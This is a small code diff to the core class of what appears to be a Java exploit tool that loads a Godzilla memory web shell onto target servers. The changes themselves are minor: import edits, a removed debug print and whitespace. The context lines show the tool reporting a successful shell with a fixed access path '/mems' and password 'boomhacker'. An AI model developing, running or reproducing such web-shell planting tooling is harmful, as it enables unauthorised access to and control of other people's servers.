@@ -1,13 +1,13 @@
 package src.main.Exp.ExpCore;
 
 import src.main.MemshellLoad.MemshellLoad;
+import src.main.impl.ResultCallback;
 
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
-import java.net.MalformedURLException;
 import java.net.URL;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
@@ -76,7 +76,6 @@ public class ExpCore {
                         Pattern pattern = Pattern.compile(resultPattern);
                         Matcher matcher = pattern.matcher(content.toString());
                         if (matcher.find()) {
-                            System.out.println(matcher.group(1));
                             if(matcher.group(1).equals("ok")) {
                                 String result = "哥斯拉GetShell成功，访问地址为/mems， 密码为boomhacker";
                                 builder.add(result);
@@ -93,6 +92,6 @@ public class ExpCore {
                 }
             }
         }
-        return builder.build();
+        return  builder.build();
     }
 }
